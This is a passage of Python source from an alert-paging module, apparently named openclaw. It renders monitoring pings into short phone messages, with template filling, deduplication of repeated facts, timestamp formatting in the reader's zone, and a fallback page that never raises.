    than it yields one piece rather than none; both callers hand this a first
    piece their budget can hold, and the catalogue test that pins
    `PAGE_MAX_CHARS` against the longest sentence the catalogue can render is
    what keeps that true for the page.
    """
    kept: list[str] = []
    length = 0
    for piece in pieces:
        if not piece:
            continue
        addition = len(piece) + (len(separator) if kept else 0)
        if kept and length + addition > budget:
            break
        kept.append(piece)
        length += addition
    return kept


def render(
    selection: Selection, facts: tuple[_ping_facts.PingFact, ...], *, language: str
) -> str:
    """The page text for a selection, empty for a silence.

    Every sentence comes out of the catalogue; the only thing that varies is
    which template and which typed field went into it. The aspect and every
    relation are licensed here against these facts, whether or not the
    selection came from `parse_choice`.

    A selection whose lead ping is not in `facts` raises `InvalidChoice`, the
    same refusal `parse_choice` makes, because an out-of-batch lead is a page
    about a ping nobody has. A selection that renders to nothing returns
    `floor` instead of "", so the only empty string this returns is a silence.

    The page is bounded at both ends of the size question: every value crosses
    `_page_value`, and the sentences are fitted to `PAGE_MAX_CHARS`, so neither
    one long field nor one long batch decides how long the message is.
    """
    if selection.verdict == "silent":
        return ""
    tongue = page_language_or_default(language)
    lead_fact = _lead_fact(selection.lead, facts)
    sentences = [_lead_sentence(lead_fact, str(selection.aspect), tongue)]
    sentences.extend(_detail_sentences(lead_fact, tongue, said=sentences[0] or ""))
    sentences.extend(_also_sentences(selection.also, facts, lead_fact, tongue))
    if not any(sentences):
        # Not one field of the lead fact rendered. The floor knows what the
        # rest of the batch carries and this function does not, and a page that
        # says nothing is the one outcome the house rules forbids.
        return floor(facts, language=tongue)
    return _page_text(sentences)


#: The one severity a reader has to act on differently, said in a sentence a
#: person wrote per value, which is exactly the escape `UNSAYABLE_FIELDS`
#: describes for a field that must not be slotted as a bare word.
#:
# THERE IS NO URGENCY SENTENCE, ON PURPOSE.
#
# The obvious one is "This one needs you now." on every critical lead, on the
# reasoning that stripping the banner took the sender's marker with it and left
# a warning and a critical reading identically. It is wrong for the usual
# criticals: a deploy gate going red heals without anyone touching it, because
# a gate refusing to ship IS the safety mechanism working, and a secret-scan
# finding is about a commit already pushed.
#
# The sentence is a claim about the READER'S obligations, and nothing here can
# know that. A sender marks how bad a thing is; whether a person must get up is
# a different question and this module has no way to answer it. Saying it about
# every critical is how it comes to mean nothing.
#
# What carries severity instead: the subject itself. "verification gate RED"
# and "secret scan found a possible committed secret" do not need a sentence
# telling the reader they matter. And the pen now holds every page between
# 22:00 and 07:30 (`notify_flush`), so the question this line was answering,
# whether to get up, mostly does not arise any more.


def _page_text(sentences: list[str]) -> str:
    """One page: the sentences that fit the budget, joined into one paragraph.

    Sentences go in page order and the first that does not fit ends the page,
    because half a sentence about a ping is a claim nobody wrote. "" means
    every sentence came back empty, which `render` has already ruled out before
    it calls this and the floor answers with `_bare_floor`.
    """
    return " ".join(_fitting(sentences, " ", PAGE_MAX_CHARS))


def _lead_sentence(fact: _ping_facts.PingFact, aspect: str, language: str) -> str:
    """The one sentence the page leads with: the first variant of the aspect
    this fact LICENSES whose every slot carries a value.

    An unlicensed aspect is downgraded to `failure`, which every fact licenses
    by definition, rather than refused: this runs on the floor too, and the
    floor may not end in a raise. The downgrade is what keeps "Ping 0 on this
    subject" off a page about a history nobody read, because an unknown history
    fills the escalation template perfectly well with a count of zero.

    A licensed aspect whose every variant is missing a field falls to the
    `failure` templates as well, for the same reason and not the same cause: a
    fact can license `blocks_deploy` and still have no `observed_at` to stamp
    the sentence with. "" is returned only when the plain failure line will not
    fill either, which needs a fact carrying neither a subject nor a stamp.
    """
    spoken = aspect if licenses_aspect(fact, aspect) else _ALWAYS_LICENSED_ASPECT
    if spoken != aspect:
        log.warning(
            "ping %s does not license aspect %r; leading with %r",
            fact.ping_id,
            aspect,
            spoken,
        )
    return (
        _first_fillable(TEMPLATES[language].get(spoken, ()), fact)
        or _first_fillable(TEMPLATES[language][_ALWAYS_LICENSED_ASPECT], fact)
        or ""
    )


def _detail_sentences(
    fact: _ping_facts.PingFact, language: str, *, said: str = ""
) -> list[str]:
    """The typed sentences that follow the lead, each one left out when the
    fields it needs are empty or when the lead has already said them.

    A history nobody read adds no sentence. A sentence saying so on every
    floor page would be openclaw talking about its own bookkeeping to a
    reader who does something about the failure and nothing about the lookup. The clause 3 rule it was meant to make visible is
    enforced in `licenses_aspect`, which refuses both `escalation` and
    `first_seen` on an unread history, so nothing here can read as a repeat or
    as a first time either way.

    `said` is the lead sentence, and the no-repeat rule the catalogue above has
    always CLAIMED ("everything the sender parsed rides in DETAILS below, so no
    fact is said twice") is enforced here rather than only intended. Where it is
    easiest to notice: a `unit_failed` sender puts the unit in its own subject,
    so without this the page would read "systemd unit failed: example.service.
    ... Host example-host, unit example.service.", which is unreadable: the
    second half of it is the first half again.

    A variant is skipped when every value it would slot is already in the lead,
    and the ladder falls through to a shorter variant that still adds something.
    Not per sentence but per VARIANT, so "Host X, unit Y" with Y already said
    degrades to "Host X" instead of vanishing; a fact the lead does not carry
    is never dropped for sitting next to one that it does.
    """
    return [
        filled
        for detail in DETAILS[language]
        if (filled := _first_fillable(_adding_to(detail, fact, said), fact))
    ]


def _adding_to(
    variants: tuple[str, ...], fact: _ping_facts.PingFact, said: str
) -> tuple[str, ...]:
    """`variants`, minus the ones whose every value the lead already carries.

    Compared on the VALUES rather than on the rendered sentence, because the
    repeat is a fact appearing twice and not a form of words: the lead says
    "systemd unit failed: harness-textfile.service" and the detail would say
    "unit harness-textfile.service", which share no phrasing and one fact.
    """
    if not said:
        return variants
    kept = []
    for variant in variants:
        values = [
            _render_slot(path, _resolve(fact, path)) for path in slots_in(variant)
        ]
        if any(value and value in said for value in values):
            # ANY, not ALL: a variant naming one already-said fact falls
            # through to the next rung, which is the same sentence without it.
            # On ALL it survived on the strength of the host beside it and put
            # the unit on the page twice, which is the defect this exists for.
            # A ladder whose every rung repeats something ends empty, and that
            # is right: there was nothing left to add.
            continue
        kept.append(variant)
    return tuple(kept)


def _also_sentences(
    also: tuple[tuple[int, str], ...],
    facts: tuple[_ping_facts.PingFact, ...],
    lead_fact: _ping_facts.PingFact,
    language: str,
) -> list[str]:
    """The ride-along lines, in the order the selection put their pings in,
    with the ones that would say the same thing folded into one.

    Four lines differing in nothing but a stamp is what makes a page
    unreadable, so a group of them arrives as one line naming every
    moment. A group keeps the place of its first line: the page order is the
    order the selection chose, and folding is not a reordering.
    """
    lines = _licensed_lines(also, facts, lead_fact, language)
    shared, rest = _sharing_a_moment(lines, language)
    sentences: list[str] = []
    for relation, variant, group in _folded(rest):
        sentences.extend(_relation_sentences(relation, variant, group, language))
    for relation, group in shared:
        sentences.append(_together_sentence(relation, group, language))
    return sentences


def _sharing_a_moment(
    lines: list[tuple[str, str, _ping_facts.PingFact]], language: str
) -> tuple[
    list[tuple[str, list[_ping_facts.PingFact]]],
    list[tuple[str, str, _ping_facts.PingFact]],
]:
    """The lines that can be said as one sentence about one moment, split off.

    The fold below groups lines that say the SAME thing at different moments.
    This is the other half: lines that say DIFFERENT things at the same moment.
    Two pings arriving in the same second would otherwise put "Also in this
    batch: ..." on the page twice, each with its own copy of the stamp, which
    is unreadable.

    A group needs at least two lines, one relation with a written together-line,
    one moment, and a sentence that actually renders; anything short of that
    stays in `rest` and is said exactly as it was. A page never drops a ping to
    save a repetition.
    """
    written = TOGETHER_RELATION_TEMPLATES.get(language, {})
    groups: dict[tuple[str, str], list[_ping_facts.PingFact]] = {}
    order: list[tuple[str, str]] = []
    for relation, _variant, fact in lines:
        if relation not in written:
            continue
        key = (relation, _stamp(fact.observed_at))
        if key not in groups:
            order.append(key)
        groups.setdefault(key, []).append(fact)

    shared: list[tuple[str, list[_ping_facts.PingFact]]] = []
    folded_ids: set[int] = set()
    for key in order:
        relation, _moment = key
        group = groups[key]
        if len(group) < 2 or not _together_sentence(relation, group, language):
            continue
        shared.append((relation, group))
        folded_ids.update(fact.ping_id for fact in group)
    rest = [line for line in lines if line[2].ping_id not in folded_ids]
    return shared, rest


def _together_sentence(
    relation: str, group: list[_ping_facts.PingFact], language: str
) -> str:
    """One sentence naming every subject in a group that shares a moment.

    The subjects are the senders' own, quoted and listed; nothing here rewords
    one. Empty when the sentence cannot be written, which is what keeps the
    group in `rest` rather than losing it.
    """
    subjects = _subject_list(
        [fact.display_subject for fact in group if fact.display_subject], language
    )
    if not subjects:
        return ""
    together = Together(subjects=subjects, count=len(group))
    return (
        _first_fillable(
            TOGETHER_RELATION_TEMPLATES[language].get(relation, ()),
            _together_holder(group[0], together),
        )
        or ""
    )


def _together_holder(
    fact: _ping_facts.PingFact, together: Together
) -> SimpleNamespace:
    """One fact plus the group's own list, as the single holder `_fill` reads.

    Same shape as `_repeat_holder` and for the same reason: every slot of a
    template resolves off one object, and the fact's fields are copied by name
    so a field added to `PingFact` is carried without this hearing about it.
    """
    return SimpleNamespace(
        together=together, **{name: getattr(fact, name) for name in _FACT_FIELDS}
    )


def _subject_list(subjects: list[str], language: str) -> str:
    """Several subjects the way a person writes a list, each one quoted.

    Quoted because a subject is a sender's own headline and a page that runs
    two of them together unquoted reads as one long subject. The last joiner is
    a word rather than a comma for the same reason `_moments` uses one: a
    trailing comma before the final item reads as a fourth item that got cut.
    """
    quoted = [f'"{one}"' for one in subjects if one]
    if not quoted:
        return ""
    if len(quoted) == 1:
        return _page_value(quoted[0])
    joiner = " en " if language == "nl" else " and "
    return _page_value(", ".join(quoted[:-1]) + joiner + quoted[-1])


def _licensed_lines(
    also: tuple[tuple[int, str], ...],
    facts: tuple[_ping_facts.PingFact, ...],
    lead_fact: _ping_facts.PingFact,
    language: str,
) -> list[tuple[str, str, _ping_facts.PingFact]]:
    """(relation, template, fact) for every ride-along line this page may say.

    Everything the selection asks for that the facts do not carry is dropped
    here, the same way `parse_choice` refuses it: "the same exit code" between
    two pings that share no exit code is a claim about this batch that nothing
    in it carries. A ping the batch does not hold, a relation with no written
    line, and a fact filling no variant of one go the same way.
    """
    by_id = {fact.ping_id: fact for fact in facts}
    lines: list[tuple[str, str, _ping_facts.PingFact]] = []
    for ping_id, relation in also:
        fact = by_id.get(ping_id)
        if fact is None:
            continue
        if relation not in RELATION_TEMPLATES[language]:
            log.warning("relation %r has no written line; dropping it", relation)
            continue
        if not licenses_relation(lead_fact, fact, relation):
            log.warning(
                "pings %s and %s do not license relation %r; dropping the line",
                lead_fact.ping_id,
                ping_id,
                relation,
            )
            continue
        variant = _fillable_variant(RELATION_TEMPLATES[language][relation], fact)
        if variant is not None:
            lines.append((relation, variant, fact))
    return lines


def _folded(
    lines: list[tuple[str, str, _ping_facts.PingFact]],
) -> list[tuple[str, str, list[_ping_facts.PingFact]]]:
    """The lines that say the same thing apart from the moment, grouped.

    Grouped on the sentence itself with its moment taken out, so two lines are
    folded exactly when the words a reader would see are the same. Judging it
    on the relation alone would fold "Also in this batch" about two different
    subjects into one line about neither.
    """
    groups: dict[tuple[str, str, str], list[_ping_facts.PingFact]] = {}
    for relation, variant, fact in lines:
        said = _fill(_without_the_moment(variant), fact) or ""
        groups.setdefault((relation, variant, said), []).append(fact)
    return [
        (relation, variant, group)
        for (relation, variant, _said), group in groups.items()
    ]


def _without_the_moment(template: str) -> str:
    """One line's template with its moment slot taken out: the half two folded
    lines have in common."""
    return template.replace(_MOMENT_SLOT, "")


def _relation_sentences(
    relation: str,
    variant: str,
    group: list[_ping_facts.PingFact],
    language: str,
) -> list[str]:
    """The page lines for one group: the folded line, or the lines it folds.

    A fold that will not render, because no folded line is written for that
    relation, falls back to saying each line on its own. A page that drops a
    ping to save a repetition has the priorities the wrong way round.
    """
    if len(group) > 1:
        folded = _folded_sentence(relation, group, language)
        if folded:
            return [folded]
    return [filled for fact in group if (filled := _fill(variant, fact))]


def _folded_sentence(
    relation: str, group: list[_ping_facts.PingFact], language: str
) -> str | None:
    """Several identical lines as the one line that names every moment."""
    repeat = Repeat(times=len(group), moments=_moments(group, language))
    return _first_fillable(
        REPEATED_RELATION_TEMPLATES[language].get(relation, ()),
        _repeat_holder(group[0], repeat),
    )


def _repeat_holder(fact: _ping_facts.PingFact, repeat: Repeat) -> SimpleNamespace:
    """One fact and the fold's own counts as the single holder `_fill` reads.

    A folded line names fields of the ping it is about AND how many times that
    line was going to be said, and every slot of a template is resolved off one
    object. The fact's fields are copied by name off the dataclass, so a field
    added to `PingFact` is carried here without this function hearing about it.
    """
    return SimpleNamespace(
        repeat=repeat, **{name: getattr(fact, name) for name in _FACT_FIELDS}
    )


def _moments(group: list[_ping_facts.PingFact], language: str) -> str:
    """When each line of a fold was observed, as one value of page text.

    The first moment is the whole stamp: the date, the reader's own zone and
    the absolute UTC reading the house rules asks for, which is what a page
    is checked against a log with. The ones after it are the time of day on the
    clock that stamp has just named, because four full stamps is 160 characters
    of clock on a phone and the fold exists to make a page readable. A batch
    can cross midnight (the pen holds from 22:00 to 07:30), which is why the
    date is on the page at all rather than on none of the moments.

    The list crosses the door like every other value, so a storm's worth of
    moments is cut there and `Repeat.times` is what still tells the reader how
    many there were.
    """
    moments = [_stamp(group[0].observed_at)]
    moments.extend(_time_of_day(fact.observed_at) for fact in group[1:])
    return _in_a_row(moments, language)


def _in_a_row(moments: list[str], language: str) -> str:
    """A list of moments the way a person writes one: commas between them and a
    word before the last."""
    if len(moments) < 2:
        return "".join(moments)
    joiner = MOMENT_LAST_JOIN.get(language, MOMENT_LAST_JOIN[LANGUAGES[0]])
    return MOMENT_SEPARATOR.join(moments[:-1]) + joiner + moments[-1]


def _first_fillable(variants: tuple[str, ...], holder: Any) -> str | None:
    """The first variant every one of whose slots carries a value."""
    variant = _fillable_variant(variants, holder)
    return _fill(variant, holder) if variant is not None else None


def _fillable_variant(variants: tuple[str, ...], holder: Any) -> str | None:
    """WHICH variant that is, for a caller that needs the template itself.

    The fold reads a line twice, once whole and once without its moment, and
    both readings have to be of the same variant or two lines saying the same
    thing would be compared through different sentences.
    """
    for variant in variants:
        if _fill(variant, holder) is not None:
            return variant
    return None


def _fill(template: str, holder: Any) -> str | None:
    """The template with its slots filled, or None when any slot is empty.

    None is the signal that this variant does not apply, which is how a
    template naming a host stays out of a page about a ping that has no host.
    """
    values: dict[str, str] = {}
    for path in slots_in(template):
        rendered = _render_slot(path, _resolve(holder, path))
        if not rendered:
            return None
        values[path] = rendered
    return _SLOT_RE.sub(lambda match: values[match.group(1)], template)


def _resolve(holder: Any, path: str) -> Any:
    """The value at a field path, or None when the path leads nowhere.

    Paths are validated as a property of the catalogue in the tests, so a miss
    here is a bug rather than an expected branch.
    """
    value: Any = holder
    for part in path.split("."):
        value = getattr(value, part, None)
        if value is None:
            return None
    return value


def _render_slot(path: str, value: Any) -> str:
    """One typed field as page text, through the one door a value crosses.

    Empty string means "nothing to say", which drops the sentence holding it,
    and a field in `UNSAYABLE_FIELDS` says nothing whatever it holds.
    """
    if path in UNSAYABLE_FIELDS:
        log.warning(
            "%s is openclaw's own word for its own state; not rendering it", path
        )
        return ""
    text = _stamp(value) if path.endswith("_at") else _render_field(value)
    return _page_value(text)


def _stamp(value: Any, *, now: datetime | None = None) -> str:
    """One timestamp on the reader's own clock: the time, and the date only
    when it is not today.

    NARROWED on purpose. The full form, "2026-01-15 05:30 local (04:30 UTC)",
    repeated through one page about that same morning, is noise. `principles.render` says a time is
    written in local and said to be local, and the house rules asks for the absolute stamp so a page
    can be checked against a log. The date and the second clock were what made
    it absolute; on a page about this morning, delivered this morning, "05:30"
    is already unambiguous, and the ping bodies, the deploy log and the journal
    all still carry the full stamp for whoever goes checking. That is a desk
    job, and this is a phone.

    So the clause holds where it earns its keep and gives way where it does not:
    anything not from today keeps its date, and the zone is named on a dated
    stamp, where a reader has no context to supply it from. A stamp with no
    date is this morning by construction.

    A string that does not parse, or one carrying no offset to convert from,
    goes out exactly as the sender wrote it rather than being dressed up as a
    zone it never named. A box with no tzdata falls back to the UTC stamp: a
    missing timezone database costs the reader convenience, never the fact.
    """
    text = str(value or "").strip()
    moment = _moment_of(text)
    if moment is None:
        return text
    utc = moment.astimezone(timezone.utc)
    try:
        zone = ZoneInfo(_LOCAL_ZONE)
        local = moment.astimezone(zone)
        today = (now.astimezone(zone) if now else datetime.now(zone)).date()
    except Exception as exc:  # noqa: BLE001, Tier-2: no tzdata is not a lost page
        log.warning("page stamp could not read the local zone (%s); UTC only", exc)
        return utc.strftime("%Y-%m-%d %H:%M UTC")
    if local.date() == today:
        return f"{local:%H:%M}"
    return f"{local:%-d %b %H:%M} {_LOCAL_ZONE.split('/')[-1]}"


def _moment_of(text: str) -> datetime | None:
    """One sender's stamp as a moment on a clock, or None when it is not one.

    A string that does not parse and one carrying no offset are the same answer
    here, because both leave this module with no way to say what time it names
    without inventing the zone. Both callers hand back the sender's own text.
    """
    try:
        moment = datetime.fromisoformat(text)
    except ValueError:
        return None
    return None if moment.tzinfo is None else moment


def _time_of_day(value: Any) -> str:
    """One repeat's moment: the hour and the minute on the reader's clock.

    The first moment of a folded line carries the whole stamp, so the ones
    after it need only say when, on the clock that stamp named. A string this
    module cannot read goes out as the sender wrote it, the same refusal
    `_stamp` makes: nothing here dresses a value up as a zone it never named.
    """
    text = str(value or "").strip()
    moment = _moment_of(text)
    if moment is None:
        return text
    try:
        return f"{moment.astimezone(ZoneInfo(_LOCAL_ZONE)):%H:%M}"
    except Exception as exc:  # noqa: BLE001, Tier-2: no tzdata is not a lost page
        log.warning("page stamp could not read the local zone (%s); UTC only", exc)
        return f"{moment.astimezone(timezone.utc):%H:%M} UTC"


def _render_field(value: Any) -> str:
    """One non-timestamp field as page text. Empty string means "nothing to
    say", which drops the sentence holding it."""
    if value is None:
        return ""
    if isinstance(value, bool):
        # bool is an int in Python, and no template slots one; a stray True
        # would otherwise render as the word.
        return ""
    if isinstance(value, int):
        return str(value)
    if isinstance(value, str):
        return value.strip()
    if isinstance(value, tuple):
        return ", ".join(_render_element(element) for element in value if element)
    return str(value)


def _render_element(element: Any) -> str:
    """One element of a tuple field: a `(name, count)` pair or a bare token."""
    if isinstance(element, tuple) and len(element) == 2:
        return f"{element[0]} {element[1]}"
    return str(element)


# ---------------------------------------------------------------------------
# The floor
# ---------------------------------------------------------------------------


# How much of a storm the floor puts on a phone. It runs on the batch nobody
# selected a page for, which is exactly the batch a forty-ping storm produces,
# so it names a bounded number of DISTINCT subjects and states the counts. A
# message of thousands of characters from an uncapped floor is not one message
# on a phone.
# Capped twice, because six subjects is a short list only while a subject is
# short: `_page_value` bounds each one and this bounds the list they make.
_FLOOR_MAX_SUBJECTS = 6
_FLOOR_SUBJECTS_CHARS = 400
_SUBJECT_SEPARATOR = "; "


def floor(facts: tuple[_ping_facts.PingFact, ...], *, language: str) -> str:
    """A true page for a batch that never got a valid selection.

    Under the house rules nothing on this path may end in silence, so this
    never raises and never returns "". It leads with the loudest ping stated as
    a plain failure, which every fact licenses, names the other subjects and
    counts the batch.

    Its pieces are rendered and guarded ONE BY ONE. A floor built inside one
    try block loses every sentence to the first field that raises and falls
    back to the claim that the batch held nothing readable, even for a batch
    holding a readable gate verdict and a readable unit failure, and the
    caller would audit that line as the page for those pings and clear them
    from the pen. Nothing here states anything
    about the batch that it did not itself just render.

    The counts stand before the list of subjects, because the list is the piece
    the page budget drops first and the count of subjects is what tells a
    reader that a name is missing from it.
    """
    tongue = _floor_language(language)
    lead_fact = _floor_lead_fact(facts)
    lead_sentence = _floor_lead_sentence(lead_fact, tongue)
    named = _named_subject(lead_fact, lead_sentence)
    pieces = [lead_sentence]
    pieces.extend(_floor_details(lead_fact, tongue))
    pieces.append(_floor_counts(facts, tongue))
    pieces.append(_floor_other_subjects(facts, named, tongue))
    return _page_text(pieces) or _bare_floor(facts, tongue)


def _floor_language(language: Any) -> str:
    """The catalogue language for a floor page, for any input and never raising."""
    try:
        return page_language_or_default(language)
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not read the language (%s); English", exc)
        return LANGUAGES[0]


def _floor_lead_fact(
    facts: tuple[_ping_facts.PingFact, ...],
) -> _ping_facts.PingFact | None:
    """The ping the floor leads with, or None when there is none to pick."""
    if not facts:
        return None
    try:
        return _loudest(facts)
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not rank the batch (%s); no lead ping", exc)
        return None


def _floor_lead_sentence(fact: _ping_facts.PingFact | None, language: str) -> str:
    """The loudest ping as the plain failure line every fact licenses, "" when
    it cannot be rendered.

    Guarded alone: a lead that will not render costs the reader the lead, never
    the subjects underneath it.
    """
    if fact is None:
        return ""
    try:
        return _lead_sentence(fact, _ALWAYS_LICENSED_ASPECT, language)
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not render its lead sentence (%s)", exc)
        return ""


def _floor_details(fact: _ping_facts.PingFact | None, language: str) -> list[str]:
    """The typed detail sentences under the floor's lead, [] when they cannot
    be rendered.

    Guarded apart from the lead sentence, and kept apart from it afterwards: a
    detail that rendered is not evidence that the lead sentence did, and the
    floor decides what it has already named by reading the lead SENTENCE.
    """
    if fact is None:
        return []
    try:
        return _detail_sentences(fact, language)
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not render its lead details (%s)", exc)
        return []


def _named_subject(fact: _ping_facts.PingFact | None, lead_sentence: str) -> str:
    """The subject the lead sentence really put on the page, "" when it put none.

    Read OUT of the rendered sentence rather than assumed from the fact that
    something rendered. The floor filters this exact string out of the subjects
    underneath, so a lead that did not name the subject has to leave it in the
    list; the page that says "this subject" and never names it is what the
    other reading produces, and it needs only a lead variant without a subject
    slot in it to become live.
    """
    if fact is None or not lead_sentence:
        return ""
    try:
        subject = _subject_text(fact)
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not read its lead subject (%s)", exc)
        return ""
    return subject if subject and subject in lead_sentence else ""


def _floor_other_subjects(
    facts: tuple[_ping_facts.PingFact, ...],
    already_named: str,
    language: str,
) -> str:
    """The subjects the lead sentence did not name, deduplicated and capped,
    "" when there are none left to name.

    Capped by count and by characters both. What either cap leaves out, the
    count sentence before this one gives the reader the number of.
    """
    try:
        others = [
            subject for subject in _floor_subjects(facts) if subject != already_named
        ]
        # A named lead subject is already on the page, so it counts against
        # the cap.
        room = _FLOOR_MAX_SUBJECTS - (1 if already_named else 0)
        named = _fitting(others[:room], _SUBJECT_SEPARATOR, _FLOOR_SUBJECTS_CHARS)
        if not named:
            return ""
        return f"{FLOOR_MORE[language]} {_SUBJECT_SEPARATOR.join(named)}."
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not name the other subjects (%s)", exc)
        return ""


def _floor_counts(facts: tuple[_ping_facts.PingFact, ...], language: str) -> str:
    """How many pings on how many subjects, "" for a batch of one.

    This is what a capped list of subjects owes the reader: the caps hide
    subjects, and the count says how many there were rather than pretending the
    named ones were all of it. It goes on the page ahead of that list, so the
    number survives a budget that the list does not.
    """
    try:
        batch = Batch(ping_count=len(facts), subject_count=_subject_count(facts))
        if batch.ping_count < 2:
            return ""
        template = (
            FLOOR_ONE_SUBJECT[language]
            if batch.subject_count == 1
            else FLOOR_COUNT[language]
        )
        return _fill(template, SimpleNamespace(batch=batch)) or ""
    except Exception as exc:  # noqa: BLE001, Tier-2: the floor cannot fail
        log.warning("page floor could not count the batch (%s)", exc)
        return ""


def _subject_count(facts: tuple[_ping_facts.PingFact, ...]) -> int:
    """How many distinct subjects the batch holds, counted before any trim.

    Counted on the subject as its sender wrote it, which is the only reading
    that answers the question the floor asks. Counting trimmed text instead
    made two subjects one whenever the door had cut them to the same line or
    collapsed a different run of whitespace, and the sentence that came out of
    it, "all on one subject", is a definite false statement on a phone.
    """
    return len({raw for fact in facts if (raw := _raw_subject(fact))})


def _floor_subjects(facts: tuple[_ping_facts.PingFact, ...]) -> list[str]:
    """Every distinct subject in the batch as page text, in arrival order.

    Deduplicated as a READER sees them, because this is the list that gets
    printed and one line printed twice is a page saying the same thing twice.
    That is a different question from how many subjects arrived, which
    `_subject_count` answers on the raw text; the two numbers can differ, and
    the count sentence is the one that tells the reader so.
    """
    subjects: list[str] = []
    for fact in facts:
        subject = _subject_text(fact)
        if subject and subject not in subjects:
            subjects.append(subject)
    return subjects


def _raw_subject(fact: _ping_facts.PingFact | None) -> str:
    """One fact's subject as its sender wrote it, stripped and nothing more."""
    return _render_field(getattr(fact, "subject", None))


def _page_subject(fact: _ping_facts.PingFact | None) -> str:
    """One fact's subject as a page prints it: the severity marker and the
    product banner off, read off the field `ping_facts` already stripped.

    Nothing is stripped HERE, and that is the point. The strip happens once, in
    `ping_facts`, before the severity is read off the marker and before
    anything downstream sees the string. Stripping at render time breaks this:
    only some of the doors below would get the second rule, and the floor
    would stop recognising the subject its own lead sentence had just printed.
    """
    return _render_field(getattr(fact, "display_subject", None)) or _raw_subject(fact)


def _subject_text(fact: _ping_facts.PingFact | None) -> str:
    """One fact's subject as page text, through the door every value crosses.

    The same door as the `{display_subject}` slot, and therefore the same
    string: the floor filters the lead's subject out of the list underneath by
    comparing these two, and a second cutting rule here would make that
    comparison miss.
    """
    return _page_value(_page_subject(fact))


def _bare_floor(facts: tuple[_ping_facts.PingFact, ...], language: str) -> str:
    """The line under the floor, for a batch whose every piece came back empty.

    An empty batch is the one case in which "no readable ping in it" is a claim
    this module verified: there was nothing. A batch that HELD pings gets the
    line about the page instead, because what failed here is the rendering, and
    those pings are still whatever they are.
    """
    if not facts:
        return NOTHING_READABLE.get(language, NOTHING_READABLE["en"])
    return PAGE_NOT_ASSEMBLED.get(language, PAGE_NOT_ASSEMBLED["en"])


def _loudest(facts: tuple[_ping_facts.PingFact, ...]) -> _ping_facts.PingFact:
    """The ping the floor leads with: the loudest severity, earliest on a tie.

    A batch is as serious as its worst ping (`state.louder`), never its average.
    """
    chosen = facts[0]
    for fact in facts[1:]:
        if _state.louder(chosen.severity, fact.severity) == fact.severity and (
            fact.severity != chosen.severity
        ):
            chosen = fact
    return chosen


# ---------------------------------------------------------------------------
# Which language the page is written in
# ---------------------------------------------------------------------------


def reader_language() -> str | None:
    """Which language the page recipient reads ("nl"/"en"), or None when the
    registry does not say.

    Same resolution the old draft-checking guard used, unchanged: the page
    recipient's number, the weak by-number lookup the timer beats need,
    then the registry's per-person-before-per-role language table.
    """
    destination = _outbound.recipient()
    if not destination:
        return None
    person = _people.identify_by_number(destination)
    return _people.language_for(person.name) if person is not None else None


def page_language() -> str:
    """The language THIS page is written in.

    A reader the registry does not declare is a decided case, not a default:
    the pen pages a colleague on the engineering surface, which is English by
    CLAUDE.md hard rule, so an undeclared reader gets English. The
    registry saying nothing has never meant "English" inside `people`
    (`language_for` returns None on purpose); the decision is made here, once,
    where a page is actually written.
    """
    return page_language_or_default(reader_language() or "")


def page_language_or_default(language: str | None) -> str:
    """A language the catalogue is written in, for any input at all."""
    tongue = (language or "").strip().lower()
    return tongue if tongue in LANGUAGES else LANGUAGES[0]
